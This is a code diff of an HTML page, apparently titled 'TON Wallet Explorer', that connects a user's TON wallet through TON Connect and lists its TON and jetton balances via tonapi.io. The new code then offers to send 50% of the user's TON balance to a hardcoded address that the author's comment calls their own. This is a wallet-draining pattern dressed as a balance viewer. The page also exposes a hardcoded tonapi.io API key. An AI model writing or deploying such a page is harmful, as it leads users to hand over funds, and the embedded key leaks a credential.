@@ -1,18 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>TON</title>
+    <title>TON Wallet Explorer</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .token-list {
+            margin-top: 20px;
+        }
+        .token-item {
+            border: 1px solid #ddd;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+        }
+        .token-item h3 {
+            margin-top: 0;
+        }
+        .loading {
+            color: #666;
+            font-style: italic;
+        }
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+        #wallet-info {
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
 
 <h1>TON Connect Example</h1>
 
-<p>TON Connect и отправка 0.2 TON (!требует подтверждения пользователя).</p>
+<p>TON Connect и отправка 50% баланса (требует подтверждения пользователя).</p>
 
 <div id="ton-connect"></div>
 
-<button onclick="connectCustom()">Подключить кошелек, отправить 0.2 TON</button>
+<button onclick="connectCustom()">Подключить кошелек</button>
+
+<div id="wallet-info" style="display: none;">
+    <h2>Информация о кошельке</h2>
+    <p>Адрес: <span id="wallet-address"></span></p>
+    <div id="loading-balances" class="loading">Загрузка балансов...</div>
+    <div id="token-list" class="token-list"></div>
+    <button id="send-half-button" onclick="sendHalfBalance()" style="display: none;">Отправить 50% баланса</button>
+</div>
 
 <script>
     const manifestUrl = 'https://sositeyaisa.github.io/ton/tonconnect-manifest.json';
@@ -23,37 +70,298 @@
 
     // мой адрес кошелька для получения TON
     const recipientAddress = 'UQA1eukl_AXlRZEt8bE4H_6Efhk413CPgvPMPr5GgJhQqLgh';
+    
+    // Глобальные переменные для хранения информации о токенах
+    let walletTokens = [];
+    let connectedAddress = '';
 
-    // функция для подключения кошелька и отправки транзакции
+    // функция для подключения кошелька
     async function connectCustom() {
         try {
             const connectedWallet = await tonConnectUI.connectWallet();
             console.log("Подключенный кошелек:", connectedWallet);
-
-            const tx = {
-                validUntil: Date.now() + 5 * 60 * 1000,
-                messages: [{
-                    address: recipientAddress,
-                    amount: '200000000' // 0.2 TON (в nanotons)
-                }]
-            };
-            console.log("Объект транзакции:", tx);
-
-            const result = await tonConnectUI.sendTransaction(tx);
-            console.log("Результат транзакции:", result);
-            alert("Транзакция отправлена (0.2 TON)! Хэш: " + result.hash);
+            
+            // Получаем адрес кошелька
+            connectedAddress = connectedWallet.account.address;
+            document.getElementById('wallet-address').textContent = connectedAddress;
+            document.getElementById('wallet-info').style.display = 'block';
+            
+            // Получаем информацию о токенах
+            walletTokens = await getWalletBalances(connectedAddress);
+            displayTokens(walletTokens);
+            
+            // Показываем кнопку для отправки 50% баланса
+            document.getElementById('send-half-button').style.display = 'block';
 
         } catch (error) {
             console.error("Тип ошибки:", typeof error);
             console.error("Ошибка:", error);
             console.error("Ошибка в строке:", JSON.stringify(error));
-            alert("Транзакция не удалась проверьте консоль на наличие ошибок.");
+            alert("Не удалось подключить кошелек. Проверьте консоль на наличие ошибок.");
         }
     }
+    
+    // Функция для отображения токенов
+    function displayTokens(tokens) {
+        const tokenListElement = document.getElementById('token-list');
+        tokenListElement.innerHTML = '';
+        document.getElementById('loading-balances').style.display = 'none';
+        
+        if (tokens.length === 0) {
+            tokenListElement.innerHTML = '<p>Токены не найдены</p>';
+            return;
+        }
+        
+        tokens.forEach((token, index) => {
+            const tokenElement = document.createElement('div');
+            tokenElement.className = 'token-item';
+            
+            tokenElement.innerHTML = `
+                <h3>${token.name} (${token.symbol})</h3>
+                <p>Баланс: ${token.formattedBalance} ${token.symbol}</p>
+            `;
+            
+            tokenListElement.appendChild(tokenElement);
+        });
+    }
+    
+    // Функция для отправки 50% баланса
+    async function sendHalfBalance() {
+        try {
+            if (walletTokens.length === 0) {
+                alert("Нет доступных токенов для отправки");
+                return;
+            }
+            
+            // Получаем основной токен TON
+            const tonToken = walletTokens[0];
+            
+            // Вычисляем 50% от баланса
+            const halfBalanceNano = Math.floor(Number(tonToken.balance) / 2).toString();
+            const halfBalanceTon = Number(halfBalanceNano) / 1e9;
+            
+            // Подтверждение от пользователя
+            if (!confirm(`Вы действительно хотите отправить ${halfBalanceTon} TON (50% вашего баланса) на адрес ${recipientAddress}?`)) {
+                return;
+            }
+            
+            // Создаем транзакцию
+            const tx = {
+                validUntil: Date.now() + 5 * 60 * 1000,
+                messages: [{
+                    address: recipientAddress,
+                    amount: halfBalanceNano
+                }]
+            };
+            
+            console.log("Объект транзакции:", tx);
+            
+            // Отправляем транзакцию (требует подтверждения пользователя в кошельке)
+            const result = await tonConnectUI.sendTransaction(tx);
+            console.log("Результат транзакции:", result);
+            alert("Транзакция отправлена (50% баланса TON)! Хэш: " + result.hash);
+            
+            // Обновляем информацию о балансах
+            walletTokens = await getWalletBalances(connectedAddress);
+            displayTokens(walletTokens);
+            
+        } catch (error) {
+            console.error("Тип ошибки:", typeof error);
+            console.error("Ошибка:", error);
+            console.error("Ошибка в строке:", JSON.stringify(error));
+            alert("Транзакция не удалась. Проверьте консоль на наличие ошибок.");
+        }
+    }
+
+    // Функция для получения балансов кошелька
+    async function getWalletBalances(walletAddress) {
+        // Получите новый токен на https://tonapi.io/
+        const tonApiToken = '45aed36e4b36070265bd8be5b8ab2fcea33d5ddd05a76de612447070a016c283';
+        
+        // 1. Получение баланса основного токена TON
+        async function getTonBalance(address) {
+            try {
+                const url = `https://tonapi.io/v2/accounts/${address}`;
+                console.log("Запрос баланса TON к URL:", url);
+                
+                const response = await fetch(url, {
+                    headers: {
+                        'X-API-Key': tonApiToken,
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`HTTP error! Статус: ${response.status}, Ответ: ${errorText}`);
+                }
+
+                const data = await response.json();
+                console.log("Ответ API для баланса TON:", JSON.stringify(data, null, 2));
+                
+                // Получаем баланс в наноТОНах
+                const balanceNano = data.balance || "0";
+                
+                // TON имеет 9 десятичных знаков
+                const balanceTon = Number(balanceNano) / 1e9;
+                
+                return {
+                    type: "native",
+                    name: "Toncoin",
+                    symbol: "TON",
+                    balance: balanceNano,
+                    formattedBalance: balanceTon.toString(),
+                    decimals: 9
+                };
+            } catch (error) {
+                console.error("Ошибка при получении баланса TON:", error);
+                return {
+                    type: "native",
+                    name: "Toncoin",
+                    symbol: "TON",
+                    balance: "0",
+                    formattedBalance: "0",
+                    decimals: 9,
+                    error: error.message
+                };
+            }
+        }
+        
+        // 2. Получение списка Jetton
+        async function getJettons(address) {
+            try {
+                const url = `https://tonapi.io/v2/accounts/${address}/jettons`;
+                console.log("Запрос Jettons к URL:", url);
+                
+                const response = await fetch(url, {
+                    headers: {
+                        'X-API-Key': tonApiToken,
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`HTTP error! Статус: ${response.status}, Ответ: ${errorText}`);
+                }
+
+                const data = await response.json();
+                console.log("Ответ API для jettons:", JSON.stringify(data, null, 2));
+                
+                if (data && Array.isArray(data.jettons)) {
+                    return data.jettons;
+                }
+                
+                return [];
+            } catch (error) {
+                console.error("Ошибка при получении Jettons:", error);
+                return [];
+            }
+        }
+
+        // 3. Получение информации о Jetton
+        async function getJettonInfo(jettonData) {
+            try {
+                const jettonAddress = jettonData.address;
+                console.log("Получение информации о jetton:", jettonAddress);
+                
+                const url = `https://tonapi.io/v2/jettons/${jettonAddress}`;
+                console.log("Запрос к URL:", url);
+                
+                const response = await fetch(url, {
+                    headers: {
+                        'X-API-Key': tonApiToken,
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`HTTP error! Статус: ${response.status}, Ответ: ${errorText}`);
+                }
+
+                const data = await response.json();
+                
+                // Возвращаем информацию о Jetton
+                return {
+                    type: "jetton",
+                    jettonAddress: jettonAddress,
+                    balance: jettonData.balance,
+                    name: data.name || "Неизвестно",
+                    symbol: data.symbol || "???",
+                    decimals: data.decimals || 9
+                };
+            } catch (error) {
+                console.error("Ошибка при получении информации о Jetton:", error);
+                return null;
+            }
+        }
+
+        // Получаем баланс TON
+        const tonBalance = await getTonBalance(walletAddress);
+        
+        // Получаем список Jetton
+        const jettons = await getJettons(walletAddress);
+        console.log(`Найдено ${jettons.length} jettons для адреса ${walletAddress}`);
+
+        // Массив для всех балансов (TON + Jettons)
+        const allBalances = [tonBalance];
+
+        // Получаем информацию о каждом Jetton
+        for (const jetton of jettons) {
+            const jettonInfo = await getJettonInfo(jetton);
+            if (jettonInfo) {
+                // Преобразуем баланс с учетом decimals
+                const rawBalance = BigInt(jetton.balance);
+                const decimals = jettonInfo.decimals;
+                const formattedBalance = Number(rawBalance) / Math.pow(10, decimals);
+                
+                allBalances.push({
+                    ...jettonInfo,
+                    formattedBalance: formattedBalance.toString()
+                });
+            }
+        }
+
+        // Выводим информацию о балансах в консоль
+        console.log("\n=== ИТОГОВЫЕ БАЛАНСЫ ===");
+        console.log("Основной токен TON:", allBalances[0].formattedBalance, "TON");
+        
+        if (allBalances.length > 1) {
+            console.log("\nJetton токены:");
+            for (let i = 1; i < allBalances.length; i++) {
+                const token = allBalances[i];
+                console.log(`${token.name} (${token.symbol}): ${token.formattedBalance}`);
+            }
+        } else {
+            console.log("\nJetton токены не найдены");
+        }
+        
+        console.log("\nПолная информация о балансах:", JSON.stringify(allBalances, null, 2));
+
+        return allBalances;
+    }
+    
+    // Проверяем, подключен ли уже кошелек
+    tonConnectUI.onStatusChange(async (wallet) => {
+        if (wallet) {
+            connectedAddress = wallet.account.address;
+            document.getElementById('wallet-address').textContent = connectedAddress;
+            document.getElementById('wallet-info').style.display = 'block';
+            
+            // Получаем информацию о токенах
+            walletTokens = await getWalletBalances(connectedAddress);
+            displayTokens(walletTokens);
+            
+            // Показываем кнопку для отправки 50% баланса
+            document.getElementById('send-half-button').style.display = 'block';
+        } else {
+            document.getElementById('wallet-info').style.display = 'none';
+            document.getElementById('send-half-button').style.display = 'none';
+        }
+    });
 </script>
 
 </body>
 </html>
-
-
 
